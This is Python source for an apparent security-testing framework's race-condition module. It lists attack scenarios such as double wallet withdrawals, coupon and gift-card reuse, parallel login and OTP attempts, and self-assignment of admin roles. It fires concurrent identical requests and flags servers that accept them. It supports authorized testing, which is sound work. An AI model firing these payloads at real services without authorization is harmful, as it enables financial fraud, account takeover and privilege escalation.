"""
Race Condition / TOCTOU (Time-of-Check to Time-of-Use) testing module.

Tests for race conditions by sending concurrent identical requests to exploit
timing windows in authentication, payment processing, coupon redemption,
vote/like inflation, file operations, and other stateful actions.

MITRE ATT&CK: T1068 - Exploitation for Privilege Escalation
"""

from __future__ import annotations

import json
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Race condition test scenarios.
# Each payload defines: SCENARIO_TYPE:description|method|path|body|content_type
# The module sends multiple concurrent copies of each request.

RACE_CONDITION_PAYLOADS = [
    # --- Payment / Financial ---
    "DOUBLE_CHARGE:Apply discount code twice|POST|/api/cart/apply-coupon|coupon=DISCOUNT50|application/x-www-form-urlencoded",
    "DOUBLE_CHARGE:Redeem gift card concurrently|POST|/api/giftcard/redeem|code=GIFTCARD123&amount=100|application/x-www-form-urlencoded",
    'DOUBLE_CHARGE:Double withdraw from wallet|POST|/api/wallet/withdraw|{"amount":100,"currency":"USD"}|application/json',
    'DOUBLE_CHARGE:Double transfer funds|POST|/api/transfer|{"from":"acct1","to":"acct2","amount":50}|application/json',
    'DOUBLE_CHARGE:Concurrent checkout|POST|/api/checkout|{"cart_id":"test","payment_method":"card"}|application/json',

    # --- Authentication / Session ---
    "AUTH_RACE:Parallel login to bypass rate limit|POST|/api/auth/login|username=admin&password=test|application/x-www-form-urlencoded",
    "AUTH_RACE:Concurrent password reset token generation|POST|/api/auth/reset-password|email=victim@test.com|application/x-www-form-urlencoded",
    "AUTH_RACE:Parallel OTP validation|POST|/api/auth/verify-otp|otp=123456&session=test|application/x-www-form-urlencoded",
    "AUTH_RACE:Concurrent session creation|POST|/api/auth/session|grant_type=authorization_code&code=testcode|application/x-www-form-urlencoded",
    'AUTH_RACE:Parallel token refresh|POST|/api/auth/refresh|{"refresh_token":"test_refresh_token"}|application/json',

    # --- Resource Limits / Quotas ---
    "LIMIT_BYPASS:Exceed invitation limit|POST|/api/invite|email=friend@test.com|application/x-www-form-urlencoded",
    'LIMIT_BYPASS:Exceed free tier API calls|GET|/api/resource/expensive-operation||',
    "LIMIT_BYPASS:Claim bonus multiple times|POST|/api/bonus/claim|type=signup_bonus|application/x-www-form-urlencoded",
    'LIMIT_BYPASS:Exceed download quota|GET|/api/download/premium-file||',
    "LIMIT_BYPASS:Multiple trial activations|POST|/api/subscription/trial|plan=premium|application/x-www-form-urlencoded",

    # --- Vote / Like Inflation ---
    'VOTE_INFLATE:Like post multiple times|POST|/api/posts/1/like|{}|application/json',
    'VOTE_INFLATE:Upvote concurrently|POST|/api/posts/1/vote|{"direction":"up"}|application/json',
    "VOTE_INFLATE:Rate item multiple times|POST|/api/items/1/rate|rating=5|application/x-www-form-urlencoded",
    'VOTE_INFLATE:Follow user multiple times|POST|/api/users/1/follow|{}|application/json',

    # --- Inventory / Stock ---
    'INVENTORY_RACE:Purchase last item in stock|POST|/api/orders|{"product_id":1,"quantity":1}|application/json',
    'INVENTORY_RACE:Reserve limited slot|POST|/api/reservations|{"event_id":1,"seats":1}|application/json',
    'INVENTORY_RACE:Claim limited offer|POST|/api/offers/limited/claim|{}|application/json',

    # --- File Operations ---
    "FILE_RACE:Concurrent file write|POST|/api/files/upload|file=test.txt&content=racetest|application/x-www-form-urlencoded",
    "FILE_RACE:Concurrent file rename|PUT|/api/files/rename|old=test.txt&new=renamed.txt|application/x-www-form-urlencoded",
    'FILE_RACE:Concurrent config update|PUT|/api/settings|{"key":"debug","value":"true"}|application/json',

    # --- Privilege Escalation ---
    'PRIV_RACE:Concurrent role change|PUT|/api/users/self/role|{"role":"admin"}|application/json',
    'PRIV_RACE:Concurrent permission grant|POST|/api/permissions/grant|{"user_id":1,"permission":"admin"}|application/json',
    'PRIV_RACE:Add self to admin group|POST|/api/groups/admins/members|{"user_id":"self"}|application/json',

    # --- Nonce / Token Reuse ---
    "NONCE_REUSE:Reuse CSRF token|POST|/api/action|csrf_token=test_token&action=delete|application/x-www-form-urlencoded",
    "NONCE_REUSE:Reuse single-use link|GET|/api/confirm/test-token-123||",
]


class RaceConditionModule(BaseAttackModule):
    """
    Race condition / TOCTOU testing.

    Sends concurrent identical requests to detect race conditions in:
    - Financial operations (double-spend, coupon reuse)
    - Authentication (rate limit bypass, session races)
    - Resource limits (quota bypass, trial abuse)
    - State mutations (vote inflation, inventory races)
    - File operations (TOCTOU read/write)
    - Privilege escalation (role assignment races)

    The module sends N concurrent copies of each request and analyzes
    whether the server processed them all (indicating a race condition)
    or properly serialized/deduplicated them.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="race_condition",
            description="Race Condition / TOCTOU - concurrent request exploitation for double-spend, auth bypass, limit bypass",
            category="race_condition",
            mitre_technique_ids=["T1068"],
            mitre_technique_names=["Exploitation for Privilege Escalation"],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            owasp_category="A04:2021 - Insecure Design",
            cwe_ids=["CWE-362", "CWE-367", "CWE-366"],
            tags=["race", "toctou", "concurrency", "double-spend", "timing"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(RACE_CONDITION_PAYLOADS)

        # Allow users to specify custom race targets
        custom_endpoints = options.get("race_endpoints", [])
        for endpoint in custom_endpoints:
            method = endpoint.get("method", "POST")
            path = endpoint.get("path", "/")
            body = endpoint.get("body", "")
            ct = endpoint.get("content_type", "application/json")
            desc = endpoint.get("description", "Custom race test")
            payloads.append(f"CUSTOM_RACE:{desc}|{method}|{path}|{body}|{ct}")

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("race_condition", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        concurrency = options.get("race_concurrency", 10)

        for payload in payloads:
            parts = payload.split(":", 1)
            attack_type = parts[0] if len(parts) > 1 else "UNKNOWN"
            details = parts[1] if len(parts) > 1 else parts[0]

            segments = details.split("|")
            if len(segments) < 3:
                continue

            description = segments[0]
            method = segments[1]
            path = segments[2]
            body = segments[3] if len(segments) > 3 else ""
            content_type = segments[4] if len(segments) > 4 else "application/x-www-form-urlencoded"

            # Use options path override if provided and payload uses generic path
            if options.get("path"):
                path = options["path"]

            # Generate N concurrent identical requests with a shared batch ID
            batch_id = uuid.uuid4().hex[:8]
            for i in range(concurrency):
                req_id = f"race-{batch_id}-{i:03d}"
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method=method,
                    path=path,
                    body=body if body else None,
                    content_type=content_type,
                    headers={
                        "X-BAS-Payload": payload,
                        "X-BAS-Attack-Type": attack_type,
                        "X-BAS-Batch-ID": batch_id,
                        "X-BAS-Race-Index": str(i),
                        "X-BAS-Description": description,
                    },
                    timeout=options.get("timeout", 30.0),
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        payload_used = request.headers.get("X-BAS-Payload", payload)
        batch_id = request.headers.get("X-BAS-Batch-ID", "")
        race_index = request.headers.get("X-BAS-Race-Index", "0")
        description = request.headers.get("X-BAS-Description", "")

        severity_map = {
            "DOUBLE_CHARGE": "critical",
            "AUTH_RACE": "high",
            "LIMIT_BYPASS": "medium",
            "VOTE_INFLATE": "low",
            "INVENTORY_RACE": "high",
            "FILE_RACE": "medium",
            "PRIV_RACE": "critical",
            "NONCE_REUSE": "high",
            "CUSTOM_RACE": "medium",
        }

        # Success response on a concurrent request = potential race condition
        # The real detection happens when multiple requests in the same batch
        # all succeed, but we flag each successful one for correlation
        if response.status_code in (200, 201, 204):
            # Look for indicators that the action was actually performed
            success_indicators = [
                "success", "ok", "created", "applied", "redeemed",
                "confirmed", "approved", "completed", "accepted",
                "true", "done", "processed",
            ]
            body_lower = body.lower()
            action_confirmed = any(ind in body_lower for ind in success_indicators)

            # Check for explicit error/rejection indicators
            rejection_indicators = [
                "already", "duplicate", "limit", "exceeded",
                "denied", "rejected", "conflict", "used",
                "expired", "invalid", "locked",
            ]
            was_rejected = any(ind in body_lower for ind in rejection_indicators)

            if action_confirmed and not was_rejected:
                return ModuleResult(
                    module_name="race_condition",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=(
                        f"Race condition potential: concurrent request #{race_index} "
                        f"in batch {batch_id} succeeded ({description}). "
                        f"Correlate with other requests in same batch to confirm."
                    ),
                    severity=severity_map.get(attack_type, "medium"),
                    mitre_technique_id="T1068",
                    detail={
                        "detection_type": f"race_{attack_type.lower()}",
                        "attack_type": attack_type,
                        "batch_id": batch_id,
                        "race_index": int(race_index),
                        "description": description,
                    },
                )

        # HTTP 409 Conflict = server properly handles concurrency
        if response.status_code == 409:
            return ModuleResult(
                module_name="race_condition",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence="Server returned 409 Conflict - proper concurrency handling",
                detail={
                    "detection_type": "proper_handling",
                    "attack_type": attack_type,
                    "batch_id": batch_id,
                },
            )

        # HTTP 429 Too Many Requests = rate limiting in place
        if response.status_code == 429:
            return ModuleResult(
                module_name="race_condition",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence="Server returned 429 - rate limiting active",
                detail={
                    "detection_type": "rate_limited",
                    "attack_type": attack_type,
                    "batch_id": batch_id,
                },
            )

        return ModuleResult(
            module_name="race_condition",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={
                "attack_type": attack_type,
                "batch_id": batch_id,
                "race_index": int(race_index),
            },
        )
